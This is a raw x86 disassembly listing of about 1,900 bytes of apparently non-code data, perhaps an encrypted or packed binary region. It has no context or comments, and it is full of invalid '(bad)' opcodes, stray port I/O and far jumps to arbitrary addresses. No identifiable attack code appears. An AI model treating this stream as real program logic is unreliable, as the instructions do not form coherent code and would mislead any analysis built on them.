  409a5d:	add    eax,0x4617aac1
  409a62:	xor    dl,BYTE PTR [esi]
  409a64:	out    0x1e,eax
  409a66:	mov    al,0xec
  409a68:	repnz or ebp,DWORD PTR [eax+0x4cea22aa]
  409a6f:	test   BYTE PTR [edi],dh
  409a71:	push   eax
  409a72:	mov    bl,0x84
  409a74:	daa    
  409a75:	out    0x22,al
  409a77:	fs jb  0x409a7a
  409a7a:	call   0x1f094b34
  409a7f:	es inc ebp
  409a81:	fmul   QWORD PTR [eax-0x3e]
  409a84:	sbb    eax,0x1a05f0f0
  409a89:	js     0x409a91
  409a8b:	push   ss
  409a8c:	lea    edi,ds:[esi-0x13cde0e7]
  409a93:	aaa    
  409a94:	mov    al,0xe7
  409a96:	mov    al,0x10
  409a98:	and    dh,BYTE PTR [ebp+0x49]
  409a9b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  409a9d:	push   esp
  409a9e:	(bad)  
  409a9f:	(bad)  [ebx]
  409aa1:	jbe    0x409b07
  409aa3:	mov    esi,0x5ddbe192
  409aa8:	dec    edi
  409aa9:	out    0x14,al
  409aab:	(bad)  [edx+0x2e]
  409aae:	mov    db4,eax
  409ab1:	pop    edi
  409ab2:	mov    esp,0x5aa72596
  409ab7:	mov    edx,0xbd202b84
  409abc:	int3   
  409abd:	sbb    ecx,DWORD PTR [edx+0x30a3d385]
  409ac3:	xor    DWORD PTR [edi],edi
  409ac5:	add    DWORD PTR [esi-0x70],ebp
  409ac8:	mov    DWORD PTR [eax+0x16],edx
  409acb:	xchg   edi,eax
  409acc:	xor    esp,edi
  409ace:	outs   dx,BYTE PTR ds:[esi]
  409acf:	or     edx,DWORD PTR [edi+0x77aac953]
  409ad5:	mov    al,ds:0xb83fbd87
  409ada:	pop    edx
  409adb:	and    bh,BYTE PTR [edx-0x65895a4f]
  409ae1:	dec    edx
  409ae2:	and    eax,0x84683d8b
  409ae7:	mov    ecx,0x45f9523
  409aec:	aas    
  409aed:	mov    edi,0x4eb8dc78
  409af2:	mov    DWORD PTR ds:0x4582e73d,ebx
  409af8:	gs popf 
  409afa:	icebp  
  409afb:	adc    DWORD PTR [edi-0x30],ebp
  409afe:	shl    BYTE PTR [edx+0x3a],0xc6
  409b02:	pop    edx
  409b03:	ror    bh,0x11
  409b06:	jae    0x409b35
  409b08:	dec    eax
  409b09:	jmp    0x409af6
  409b0b:	test   ecx,edx
  409b0d:	push   ds
  409b0e:	(bad)  
  409b0f:	into   
  409b10:	mul    DWORD PTR ds:[eax-0x73]
  409b14:	cmp    DWORD PTR [ebx+edi*4-0x5f183164],eax
  409b1b:	sbb    BYTE PTR [edx],al
  409b1d:	cmp    eax,0x4db162c
  409b22:	push   ds
  409b23:	or     ah,ah
  409b25:	sbb    ch,dl
  409b27:	ret    0x8e8c
  409b2a:	pop    edx
  409b2b:	jp     0x409ac5
  409b2d:	xor    BYTE PTR [eax],ch
  409b2f:	iret   
  409b30:	adc    dh,BYTE PTR [esi+0x7d]
  409b33:	test   DWORD PTR ds:0x6f8e324,ebx
  409b39:	sbb    esp,DWORD PTR [ebp-0x74bc0a3]
  409b3f:	jle    0x409b7d
  409b41:	jns    0x409b61
  409b43:	js     0x409b3d
  409b45:	mov    DWORD PTR [esi-0x7c],ecx
  409b48:	neg    BYTE PTR [eax-0x37]
  409b4b:	mov    ds:0x2d59653f,eax
  409b50:	rcl    ebx,1
  409b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b53:	das    
  409b54:	inc    ebp
  409b55:	out    0xd8,al
  409b57:	mov    ds:0x4b3423af,al
  409b5c:	mov    al,ds:0xadd0198d
  409b61:	ficomp DWORD PTR [esp+ebp*4+0x47]
  409b65:	push   esi
  409b66:	cmp    ebp,edx
  409b68:	add    al,0xe7
  409b6a:	jl     0x409b2d
  409b6c:	inc    ecx
  409b6d:	mov    ebx,0xb8842135
  409b72:	arpl   sp,cx
  409b74:	fsub   st(6),st
  409b76:	pop    ebx
  409b77:	xchg   edx,eax
  409b78:	cdq    
  409b79:	jb     0x409ba4
  409b7b:	std    
  409b7c:	sub    dh,BYTE PTR ds:0xc58d84ef
  409b82:	inc    esi
  409b83:	stos   DWORD PTR es:[edi],eax
  409b84:	and    bl,BYTE PTR [edi-0x6]
  409b87:	stos   BYTE PTR es:[edi],al
  409b88:	dec    edx
  409b89:	in     al,0xb6
  409b8b:	mov    dl,0xcc
  409b8d:	outs   dx,BYTE PTR ds:[esi]
  409b8e:	or     DWORD PTR [esi+0x5d2e76e],0x61
  409b95:	scas   al,BYTE PTR es:[edi]
  409b96:	dec    edx
  409b97:	int3   
  409b98:	add    ebp,DWORD PTR [ebp-0x5b]
  409b9b:	ret    0xc6d5
  409b9e:	push   esp
  409b9f:	inc    edx
  409ba0:	push   ds
  409ba1:	adc    eax,0xe6a688b9
  409ba6:	xor    BYTE PTR [eax+0x21fb1b61],dl
  409bac:	mov    cl,0xc0
  409bae:	xchg   edx,edx
  409bb0:	sbb    al,0x4d
  409bb2:	pop    edx
  409bb3:	or     dl,BYTE PTR [edi-0xb]
  409bb6:	push   esi
  409bb7:	sub    eax,0x85bede1e
  409bbc:	inc    edx
  409bbd:	out    dx,al
  409bbe:	push   eax
  409bbf:	cdq    
  409bc0:	ds int 0xf2
  409bc3:	cld    
  409bc4:	inc    esi
  409bc5:	call   0x7cd2:0xe7b571ce
  409bcc:	or     al,0x6b
  409bce:	xor    BYTE PTR [edx+0x7c],0x3e
  409bd2:	gs test al,0x33
  409bd5:	pop    esp
  409bd6:	pop    ebx
  409bd7:	push   es
  409bd8:	jg     0x409c4b
  409bda:	retf   
  409bdb:	jmp    0x85bb94ac
  409be0:	push   es
  409be1:	or     DWORD PTR [ebx+0x49953d31],ecx
  409be7:	cmp    eax,0x2c311a93
  409bec:	(bad)  
  409bed:	into   
  409bee:	lea    esi,[ebx+0x2a]
  409bf1:	out    dx,al
  409bf2:	ret    
  409bf3:	test   DWORD PTR [ebx+0x73],ebp
  409bf6:	jp     0x409be0
  409bf8:	mov    cs,WORD PTR [ebx+0x5818205c]
  409bfe:	mov    eax,DWORD PTR [ebp-0x52deca44]
  409c04:	jmp    0xfaf8:0xfd854d04
  409c0b:	sub    edi,DWORD PTR [edi]
  409c0d:	retf   
  409c0e:	add    eax,0xcfee991f
  409c13:	jmp    0x409beb
  409c15:	fsubr  QWORD PTR [edx-0x68194b6e]
  409c1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c1c:	scas   al,BYTE PTR es:[edi]
  409c1d:	js     0x409c38
  409c1f:	jnp    0x409c60
  409c21:	mov    bl,0x30
  409c23:	dec    edi
  409c24:	xor    al,0x67
  409c26:	mov    edi,0xb4e646c1
  409c2b:	sub    DWORD PTR [edx+eiz*8-0x29],esi
  409c2f:	aaa    
  409c30:	les    ebx,FWORD PTR [eax-0x63]
  409c33:	xchg   ecx,eax
  409c34:	test   BYTE PTR [ecx+eiz*2-0x1e],bh
  409c38:	or     al,0x54
  409c3a:	(bad)  [ecx-0xd]
  409c3d:	add    eax,ebx
  409c3f:	loope  0x409c85
  409c41:	push   ecx
  409c42:	test   BYTE PTR ds:[esi-0x5b],ch
  409c46:	adc    BYTE PTR [ebx+eiz*1+0x1a223095],bl
  409c4d:	es inc esi
  409c4f:	mov    esp,0x30d72a76
  409c54:	into   
  409c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c56:	pop    DWORD PTR [ebp+0x43571dec]
  409c5c:	xor    BYTE PTR [edi+0x7f1a0694],dl
  409c62:	repnz loopne 0x409bf5
  409c65:	push   edi
  409c66:	pop    edx
  409c67:	ficomp WORD PTR [esi]
  409c69:	sub    al,0xe7
  409c6b:	mov    al,ds:0x85b00fc6
  409c70:	sub    al,0x4f
  409c72:	sub    DWORD PTR [edi+0x6f],esi
  409c75:	loope  0x409cd2
  409c77:	(bad)  
  409c78:	push   ds
  409c79:	ret    
  409c7a:	adc    eax,DWORD PTR [ebx-0x40]
  409c7d:	out    0xe4,al
  409c7f:	jne    0x409c6a
  409c81:	add    edx,DWORD PTR [ebp+0x5]
  409c84:	mov    ecx,eax
  409c86:	xchg   esi,eax
  409c87:	fist   WORD PTR [esi-0xe99a471]
  409c8d:	dec    ebx
  409c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c8f:	push   0xffffffb8
  409c91:	call   0xecca20a8
  409c96:	pop    ecx
  409c97:	clc    
  409c98:	xor    BYTE PTR [ecx],ah
  409c9a:	pop    edx
  409c9b:	xor    eax,0xa87ca2b2
  409ca0:	in     eax,dx
  409ca1:	fs mov edx,0x4c6172ce
  409ca7:	stc    
  409ca8:	(bad)  
  409ca9:	xchg   edx,eax
  409caa:	sub    ch,BYTE PTR [ecx+0x902b030]
  409cb0:	(bad)  
  409cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cb2:	inc    esi
  409cb3:	inc    ebp
  409cb4:	xor    al,0x2a
  409cb6:	mov    al,dh
  409cb8:	pop    eax
  409cb9:	and    DWORD PTR [edx-0x54],ebx
  409cbc:	add    al,0x90
  409cbe:	cmp    bl,BYTE PTR [esi-0x7b5fa3fa]
  409cc4:	sbb    BYTE PTR [edx],cl
  409cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cc7:	adc    BYTE PTR [edi],bh
  409cc9:	pop    es
  409cca:	inc    edi
  409ccb:	push   es
  409ccc:	push   eax
  409ccd:	inc    ebx
  409cce:	imul   esp,DWORD PTR [eax+0x38],0xffffffe7
  409cd2:	rcr    BYTE PTR [edx+0x61],1
  409cd5:	dec    esp
  409cd6:	(bad)  
  409cd8:	cld    
  409cd9:	outs   dx,BYTE PTR ds:[esi]
  409cda:	pop    edi
  409cdb:	fldenv [edx]
  409cdd:	shl    DWORD PTR [edx-0x4a191043],0x51
  409ce4:	mov    bl,BYTE PTR [ebp-0x27d9cc51]
  409cea:	adc    eax,0xd76d8785
  409cef:	cmp    eax,DWORD PTR ds:0x3ff68ec9
  409cf5:	inc    esp
  409cf6:	mov    ds:0xcc8eafe2,al
  409cfb:	cs in  al,0x41
  409cfe:	xchg   BYTE PTR [eax+eiz*1+0x3e1fc387],al
  409d05:	(bad)  
  409d06:	sub    ah,BYTE PTR [eax+0x308235e8]
  409d0c:	mov    cl,0xe6
  409d0e:	jbe    0x409cd1
  409d10:	ret    0xeaec
  409d13:	scas   al,BYTE PTR es:[edi]
  409d14:	fldenv [ebx]
  409d16:	cmp    BYTE PTR [esi-0x7da576e8],0xe7
  409d1d:	add    BYTE PTR [ecx],cl
  409d1f:	sub    DWORD PTR [esi+0x3c937549],ecx
  409d25:	xor    eax,0x47a0c15e
  409d2a:	xchg   DWORD PTR [esi+0xc],edx
  409d2d:	in     eax,dx
  409d2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d2f:	icebp  
  409d30:	xchg   edi,eax
  409d31:	std    
  409d32:	adc    cl,BYTE PTR [edx]
  409d34:	sti    
  409d35:	jmp    0xb15a:0xf2aaa782
  409d3c:	aas    
  409d3d:	jno    0x409d46
  409d3f:	loopne 0x409d59
  409d41:	mov    ah,0x42
  409d43:	ret    
  409d44:	rcr    DWORD PTR [esi-0x41c1c176],0xe
  409d4b:	in     al,0xfd
  409d4d:	lds    edi,FWORD PTR [ebx+esi*8]
  409d50:	cmp    DWORD PTR [edi-0xb],esi
  409d53:	or     ecx,ebp
  409d55:	pop    esi
  409d56:	dec    esp
  409d57:	xlat   BYTE PTR ds:[ebx]
  409d58:	cmp    DWORD PTR [edx-0x62],ebp
  409d5b:	test   BYTE PTR [esp+ebp*2+0x55],bh
  409d5f:	test   BYTE PTR [edx-0x292a8418],cl
  409d65:	shl    DWORD PTR [esi-0x4c],0xc9
  409d69:	lock pop ebx
  409d6b:	and    al,0x77
  409d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d6e:	shl    DWORD PTR [edx-0x7ba0faf8],0x56
  409d75:	sub    al,BYTE PTR [eax]
  409d77:	xchg   ecx,eax
  409d78:	aas    
  409d79:	pop    ebp
  409d7a:	in     al,0x43
  409d7c:	xor    DWORD PTR [edx-0x70],esi
  409d7f:	mov    esi,0xeaace649
  409d84:	sub    ah,dl
  409d86:	in     al,dx
  409d87:	fst    QWORD PTR [ebx]
  409d89:	adc    BYTE PTR [edi],0x6e
  409d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d8d:	sbb    bl,BYTE PTR [ebx-0x7e]
  409d90:	js     0x409d57
  409d92:	pop    edi
  409d93:	mov    ebx,0x8476682a
  409d98:	shl    eax,cl
  409d9a:	out    0x54,eax
  409d9c:	aas    
  409d9d:	cmc    
  409d9e:	fisubr DWORD PTR [ebx+esi*1+0x16]
  409da2:	outs   dx,BYTE PTR ds:[esi]
  409da3:	mov    DWORD PTR [ecx-0x19],0x6251def0
  409daa:	cmp    DWORD PTR [edi-0x172b88eb],0xf82606d9
  409db4:	pop    esi
  409db5:	test   BYTE PTR [ebx-0x2c],bl
  409db8:	dec    ebx
  409db9:	or     eax,0xc184522c
  409dbe:	sub    BYTE PTR [eax+ebp*2+0x1b90c32d],al
  409dc5:	std    
  409dc6:	(bad)  
  409dc7:	mov    bh,BYTE PTR [esi]
  409dc9:	add    eax,0x4e068e94
  409dce:	inc    edi
  409dcf:	xchg   esp,eax
  409dd0:	jb     0x409de4
  409dd2:	push   0xee10b187
  409dd7:	jmp    0x409dd6
  409dd9:	ins    BYTE PTR es:[edi],dx
  409dda:	mov    ebp,DWORD PTR [esi+edi*1]
  409ddd:	imul   esi,DWORD PTR [esi+0x607fd803],0x9aededec
  409de7:	cmp    DWORD PTR [edi-0x77],eax
  409dea:	cdq    
  409deb:	js     0x409e1b
  409ded:	lods   al,BYTE PTR ds:[esi]
  409dee:	fiadd  WORD PTR [ecx+edx*8-0x5f161a5e]
  409df5:	sub    BYTE PTR [eax+eax*2-0x42],bl
  409df9:	or     al,BYTE PTR [edx-0x711872d7]
  409dff:	jns    0x409e23
  409e01:	scas   al,BYTE PTR es:[edi]
  409e02:	jl     0x409e16
  409e04:	mov    bh,BYTE PTR ds:0x53c8db7
  409e0a:	lods   al,BYTE PTR ds:[esi]
  409e0b:	sbb    al,0x9a
  409e0d:	into   
  409e0e:	pop    eax
  409e0f:	jns    0x409daf
  409e11:	nop
  409e12:	in     eax,0xf3
  409e14:	push   eax
  409e15:	test   ebx,ebx
  409e17:	std    
  409e18:	test   BYTE PTR [edx+ebx*2-0x35],cl
  409e1c:	pop    es
  409e1d:	cmp    cl,BYTE PTR [edi+0x48]
  409e20:	mov    ecx,edx
  409e22:	pop    edi
  409e23:	nop
  409e24:	or     ah,BYTE PTR [edi-0x77]
  409e27:	mov    cs,WORD PTR [eax+0x2ec81ae1]
  409e2d:	xor    ecx,DWORD PTR [ecx]
  409e2f:	mov    ebp,0xc519a63e
  409e34:	ds sub edx,edi
  409e37:	fldcw  WORD PTR [edx-0x7b5069a5]
  409e3d:	jmp    0xad1841da
  409e42:	test   BYTE PTR [ebx],dh
  409e44:	lea    esp,[ecx]
  409e46:	fld    TBYTE PTR [edx-0x53]
  409e49:	inc    esp
  409e4a:	or     eax,0xd8894db8
  409e4f:	ins    BYTE PTR es:[edi],dx
  409e50:	das    
  409e51:	sub    al,0x64
  409e53:	mov    ah,0x66
  409e55:	pop    ds
  409e56:	fidiv  DWORD PTR [ecx+0x6f]
  409e59:	cmp    DWORD PTR [ebp-0x75198c12],ebx
  409e5f:	add    esp,eax
  409e61:	mov    dl,0x6c
  409e63:	xchg   edi,eax
  409e64:	arpl   bp,bp
  409e66:	fcom   DWORD PTR [ebx]
  409e68:	es jmp 0x4a54:0x92c28c5b
  409e70:	scas   al,BYTE PTR es:[edi]
  409e71:	xchg   ecx,eax
  409e72:	jne    0x409df9
  409e74:	pop    esi
  409e75:	rcr    BYTE PTR [esi+ebp*2+0x3d],1
  409e79:	(bad)  
  409e7a:	nop
  409e7b:	mov    bh,0x78
  409e7d:	aaa    
  409e7e:	adc    esi,DWORD PTR [esi+eax*8-0x40]
  409e82:	add    bh,BYTE PTR [ecx-0x7a06af9e]
  409e88:	pop    ecx
  409e89:	call   0x5c78:0x613f4d88
  409e90:	loop   0x409e73
  409e92:	ins    BYTE PTR es:[edi],dx
  409e93:	shr    DWORD PTR [ecx-0x18],0x76
  409e97:	outs   dx,DWORD PTR ds:[esi]
  409e98:	(bad)  
  409e99:	push   esp
  409e9a:	push   es
  409e9b:	shl    DWORD PTR [edi],0xda
  409e9e:	inc    esp
  409e9f:	mov    al,ds:0x779b4efb
  409ea4:	inc    edi
  409ea5:	adc    eax,0xf07ee44
  409eaa:	add    ch,al
  409eac:	pop    ebx
  409ead:	out    0xb2,eax
  409eaf:	jno    0x409eaa
  409eb1:	ins    DWORD PTR es:[edi],dx
  409eb2:	mov    dh,0x20
  409eb4:	xor    al,0x7c
  409eb6:	stc    
  409eb7:	sub    al,0x25
  409eb9:	iret   
  409eba:	pop    ebx
  409ebb:	mov    WORD PTR [esi],ss
  409ebd:	scas   eax,DWORD PTR es:[edi]
  409ebe:	fsub   DWORD PTR ds:0xaa6e3682
  409ec4:	js     0x409f0b
  409ec6:	xchg   esi,eax
  409ec7:	sub    BYTE PTR [ebx],0x1c
  409eca:	addr16 jg 0x409e7b
  409ecd:	jp     0x409ef8
  409ecf:	mov    edx,DWORD PTR [edi+eiz*2]
  409ed2:	add    eax,DWORD PTR [ebp-0x26]
  409ed5:	mov    edi,0x7384b478
  409eda:	pop    edx
  409edb:	stos   BYTE PTR es:[edi],al
  409edc:	imul   edi,DWORD PTR [esi],0x23
  409edf:	xor    eax,DWORD PTR [edx]
  409ee1:	nop
  409ee2:	inc    esi
  409ee3:	test   DWORD PTR [edi+0x3744ee8d],edi
  409ee9:	adc    ecx,0x5d6e7129
  409eef:	lock xor edx,DWORD PTR [edx]
  409ef2:	fild   DWORD PTR [edi+0x4e]
  409ef5:	sbb    esp,esi
  409ef7:	test   BYTE PTR [ecx-0x75],ah
  409efa:	mov    dl,0x14
  409efc:	aas    
  409efd:	call   ebp
  409eff:	jl     0x409f60
  409f01:	sbb    edx,0x7a
  409f04:	cmc    
  409f05:	movlps xmm7,QWORD PTR [ebx-0x37e679ca]
  409f0c:	cmp    bh,bl
  409f0e:	xor    al,BYTE PTR [ebp+0xaf3b326]
  409f14:	sbb    esi,DWORD PTR [ecx-0x6e87bba8]
  409f1a:	mov    bh,0x5e
  409f1c:	mov    WORD PTR gs:[ebp-0x7a1ea9bb],ds
  409f23:	xchg   edx,eax
  409f24:	ds lahf 
  409f26:	sub    BYTE PTR [edx],al
  409f28:	pop    ds
  409f29:	push   edx
  409f2a:	jb     0x409f16
  409f2c:	(bad)  
  409f2e:	cs call 0x471f:0x57b42faf
  409f36:	xchg   esp,eax
  409f37:	out    dx,al
  409f38:	sub    eax,0xf91bd4e6
  409f3d:	push   cs
  409f3e:	repnz dec esi
  409f40:	mov    ch,0x13
  409f42:	arpl   WORD PTR [edx-0x2fa4ac5e],dx
  409f48:	and    dl,BYTE PTR [eax]
  409f4a:	or     esp,edi
  409f4c:	cmp    al,0x5b
  409f4e:	mov    ebx,0xa9b16584
  409f53:	lock aas 
  409f55:	jae    0x409f6a
  409f57:	inc    edi
  409f58:	bnd data16 ja 0x409f6a
  409f5c:	popa   
  409f5d:	in     eax,0x14
  409f5f:	stc    
  409f60:	lock ret 0xc1c1
  409f64:	int3   
  409f65:	xchg   DWORD PTR [ecx+eax*4],ebp
  409f68:	dec    eax
  409f69:	xor    DWORD PTR [esp+eax*1-0xe],0x2c844a00
  409f71:	push   esp
  409f72:	jl     0x409fde
  409f74:	adc    al,0xa7
  409f76:	pop    ds
  409f77:	test   BYTE PTR [ebp+0x2d8b4380],bh
  409f7d:	lahf   
  409f7e:	mov    ?,WORD PTR [edx+0x5]
  409f81:	out    0x5e,al
  409f83:	cmc    
  409f84:	push   esp
  409f85:	popa   
  409f86:	lock test eax,0x847324c8
  409f8c:	rcl    BYTE PTR [ecx-0x3],0x43
  409f90:	arpl   WORD PTR ds:[esi+0x17],dx
  409f94:	loope  0x409fc9
  409f96:	mov    bl,0x5f
  409f98:	loope  0x409f80
  409f9a:	hlt    
  409f9b:	outs   dx,DWORD PTR ds:[esi]
  409f9c:	aaa    
  409f9d:	add    DWORD PTR [ecx+0x69dae6e9],edx
  409fa3:	paddb  mm6,QWORD PTR [edi-0x6d81c1a6]
  409faa:	xor    BYTE PTR [ebp-0x52],ah
  409fad:	dec    edx
  409fae:	sub    al,0x84
  409fb0:	popa   
  409fb1:	mov    edx,0x713f0ac8
  409fb6:	and    eax,0x7b4f3bc
  409fbb:	xchg   DWORD PTR [ebx-0x378e3719],esp
  409fc1:	das    
  409fc2:	dec    edx
  409fc3:	in     al,dx
  409fc4:	fcomp  DWORD PTR [esi+0x36]
  409fc7:	ret    
  409fc8:	adc    al,0xee
  409fca:	dec    esp
  409fcb:	mov    al,ds:0x9a442621
  409fd0:	sar    DWORD PTR [eax-0x47],1
  409fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd4:	dec    esi
  409fd5:	std    
  409fd6:	mov    bh,0x85
  409fd8:	mov    ebx,edi
  409fda:	sbb    esp,0x10628b21
  409fe0:	je     0x40a009
  409fe2:	inc    ebx
  409fe3:	mov    bh,0x1e
  409fe5:	in     al,dx
  409fe6:	pop    ebx
  409fe7:	test   eax,0x99e98228
  409fec:	(bad)  
  409fed:	adc    cl,BYTE PTR [edx-0x9ca0cb3]
  409ff3:	and    dh,BYTE PTR [ebp+ecx*2+0x5b]
  409ff7:	or     BYTE PTR [ebx-0x58],dl
  409ffa:	int3   
  409ffb:	pop    ss
  409ffc:	jle    0x409fd3
  409ffe:	mov    bh,0xb8
  40a000:	jbe    0x409fbc
  40a002:	retf   
  40a003:	add    al,0x38
  40a005:	push   esp
  40a006:	or     dh,BYTE PTR [ebx]
  40a008:	iret   
  40a009:	dec    ecx
  40a00a:	inc    esi
  40a00b:	neg    BYTE PTR [ebx-0x5b]
  40a00e:	sbb    al,BYTE PTR [ebp-0x3e]
  40a011:	loopne 0x40a035
  40a013:	add    eax,0x39a85ed2
  40a018:	push   cs
  40a019:	add    bl,BYTE PTR [ebx]
  40a01b:	cld    
  40a01c:	ds aaa 
  40a01e:	cmp    al,0x27
  40a020:	dec    ebp
  40a021:	jmp    0x40a00f
  40a023:	fistp  DWORD PTR [esi+eiz*8+0x462a0a84]
  40a02a:	mov    edi,edx
  40a02c:	and    esp,DWORD PTR [edi-0x29]
  40a02f:	stos   DWORD PTR es:[edi],eax
  40a030:	jno    0x409ff9
  40a032:	pop    ebx
  40a033:	jmp    0x21e9:0x147894ee
  40a03a:	add    eax,DWORD PTR [edx+eax*2+0x1e]
  40a03e:	loop   0x40a039
  40a040:	fiadd  DWORD PTR [ecx+0x73f7befa]
  40a046:	mov    ch,0x4
  40a048:	repz push 0xffffff9b
  40a04b:	push   ss
  40a04c:	in     al,0x69
  40a04e:	pop    edx
  40a04f:	push   eax
  40a050:	and    edi,DWORD PTR ds:0xf43c6fa9
  40a056:	rol    DWORD PTR [ebp-0x42638fc7],0x4e
  40a05d:	rol    ebp,1
  40a05f:	mov    cl,0xb
  40a061:	mov    ebx,cs
  40a063:	and    ebx,0x67
  40a066:	add    eax,0x30fbbcc4
  40a06b:	ins    BYTE PTR es:[edi],dx
  40a06c:	sti    
  40a06d:	mov    edx,0xc601eb74
  40a072:	test   DWORD PTR fs:0xf7b4591b,ebp
  40a079:	push   0x6048c046
  40a07e:	mov    ecx,0xf0e6e945
  40a083:	outs   dx,DWORD PTR ds:[esi]
  40a084:	fdivr  DWORD PTR ds:0x20af7956
  40a08a:	imul   ebx,ebp,0x99a3713e
  40a090:	(bad)  
  40a091:	mov    bl,0x65
  40a093:	and    edx,DWORD PTR [edx-0x3da57d1a]
  40a099:	xor    ebp,ebp
  40a09b:	adc    eax,0xf69f76f2
  40a0a0:	jge    0x40a08d
  40a0a2:	dec    eax
  40a0a3:	data16 addr16 clc 
  40a0a6:	xchg   BYTE PTR [ebp-0x421d1856],al
  40a0ac:	push   ds
  40a0ad:	inc    ecx
  40a0ae:	sbb    eax,0xc95cb67a
  40a0b3:	in     al,0x4d
  40a0b5:	fstp   QWORD PTR [ebx-0x3e]
  40a0b8:	sub    eax,0x4a831a1c
  40a0bd:	cmp    eax,0x679c8622
  40a0c2:	sub    ebx,eax
  40a0c4:	xchg   ecx,eax
  40a0c5:	cs push esi
  40a0c7:	sbb    eax,0x76a8ad3f
  40a0cc:	push   ss
  40a0cd:	nop
  40a0ce:	stos   BYTE PTR es:[edi],al
  40a0cf:	dec    ecx
  40a0d0:	xchg   edx,eax
  40a0d1:	in     eax,0x6a
  40a0d3:	mov    al,0x1c
  40a0d5:	xchg   ebx,eax
  40a0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0d7:	retf   
  40a0d8:	jge    0x40a081
  40a0da:	not    BYTE PTR [ebx-0x22]
  40a0dd:	stos   DWORD PTR es:[edi],eax
  40a0de:	jbe    0x40a150
  40a0e0:	mov    ch,0x5
  40a0e2:	dec    eax
  40a0e3:	jp     0x40a12d
  40a0e5:	pop    edx
  40a0e6:	adc    DWORD PTR [esi+0x3ade09fe],eax
  40a0ec:	cmp    al,bh
  40a0ee:	and    BYTE PTR [ebp-0x590bccda],al
  40a0f4:	add    BYTE PTR [ebp-0x7ec16139],dh
  40a0fa:	jb     0x40a0d3
  40a0fc:	mov    ecx,0xccf6a3a7
  40a101:	shl    ecx,cl
  40a103:	cmp    BYTE PTR [edi-0x4f7245ab],0x6
  40a10a:	(bad)  
  40a10b:	neg    DWORD PTR [ecx+ebx*4+0x1b]
  40a10f:	push   ss
  40a110:	aas    
  40a111:	pop    ds
  40a112:	mov    dl,0x3f
  40a114:	jmp    0x9144942f
  40a119:	out    0xac,al
  40a11b:	(bad)  
  40a11c:	jb     0x40a145
  40a11e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a11f:	pop    ds
  40a120:	sahf   
  40a121:	add    cl,BYTE PTR [ecx+0x5a2f8947]
  40a127:	and    dh,BYTE PTR [ecx]
  40a129:	sub    ebp,DWORD PTR [eax+ecx*1]
  40a12c:	into   
  40a12d:	outs   dx,BYTE PTR ds:[esi]
  40a12e:	aam    0x85
  40a130:	fbstp  TBYTE PTR [edx+eax*2]
  40a133:	aaa    
  40a134:	aas    
  40a135:	retf   
  40a136:	mov    edi,0x23b2b788
  40a13b:	ins    BYTE PTR es:[edi],dx
  40a13c:	and    eax,0xa7d7a166
  40a141:	sub    al,0x3a
  40a143:	and    DWORD PTR cs:[edi],ebp
  40a146:	sbb    bh,BYTE PTR [eax-0x37ba4428]
  40a14c:	sbb    edi,ebp
  40a14e:	jmp    0x40a194
  40a150:	xchg   ebx,eax
  40a151:	xchg   edx,eax
  40a152:	dec    eax
  40a153:	fidiv  DWORD PTR [eax]
  40a155:	lods   al,BYTE PTR ds:[esi]
  40a156:	das    
  40a157:	mov    ecx,0xc9ec373
  40a15c:	mov    esi,0xc0696f18
  40a161:	ja     0x40a0f5
  40a163:	cmp    eax,0xe45ac312
  40a168:	add    al,0xa9
  40a16a:	test   al,0xdb
  40a16c:	inc    eax
  40a16d:	fldcw  WORD PTR [ecx]
  40a16f:	fcomp  DWORD PTR [esi-0x6b7be599]
  40a175:	push   cs
  40a176:	iret   
  40a177:	sub    al,0x46
  40a179:	aas    
  40a17a:	scas   eax,DWORD PTR es:[edi]
  40a17b:	and    edi,DWORD PTR [esi+0x73]
  40a17e:	add    eax,0xd55d6e85
  40a183:	inc    eax
  40a184:	and    al,0x47
  40a186:	cmp    BYTE PTR [ebx+ecx*1+0x3ea64a78],al
  40a18d:	loope  0x40a15c
  40a18f:	xchg   edi,eax
  40a190:	(bad)
  40a193:	stos   DWORD PTR es:[edi],eax
  40a194:	sar    cl,1
  40a196:	loop   0x40a11f
  40a198:	xchg   ecx,eax
  40a199:	ss (bad) 
  40a19b:	xor    eax,DWORD PTR [ebx]
  40a19d:	cmp    BYTE PTR [ebx-0x366f24b8],bl
  40a1a3:	scas   al,BYTE PTR es:[edi]
  40a1a4:	inc    edx
  40a1a5:	inc    ebx
  40a1a6:	cmp    ch,cl
  40a1a8:	jmp    ebp
  40a1aa:	or     edi,ebp
  40a1ac:	stos   BYTE PTR es:[edi],al
  40a1ad:	mov    ?,WORD PTR [ebx-0x1a]
  40a1b0:	mov    esi,0x262aa358
  40a1b5:	aas    
  40a1b6:	mov    eax,ds:0x2b71019a
  40a1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1bc:	ds retf 0x472e
  40a1c0:	mov    dh,0xd8
  40a1c2:	cmc    
  40a1c3:	in     eax,dx
  40a1c4:	lahf   
  40a1c5:	daa    
  40a1c6:	pop    ss
  40a1c7:	(bad)  
  40a1c8:	test   eax,0x97e45923
  40a1cd:	cmp    cl,BYTE PTR ds:0x6dc796c2
  40a1d3:	test   DWORD PTR [edi+0x7123417],esi
  40a1d9:	pop    es
  40a1da:	xor    dh,BYTE PTR [ebp-0x42]
  40a1dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1de:	and    al,0x72
  40a1e0:	das    
  40a1e1:	pop    eax
  40a1e2:	prefetcht2 BYTE PTR [edx-0x5b]
  40a1e6:	push   ebx
  40a1e7:	test   esp,edx
  40a1e9:	fdiv   DWORD PTR [esi-0x159919a0]
  40a1ef:	jmp    0xfc9c2960
  40a1f4:	fmul   st(3),st
  40a1f6:	add    BYTE PTR [esi+0x5a],al
  40a1f9:	dec    esi
  40a1fa:	cli    
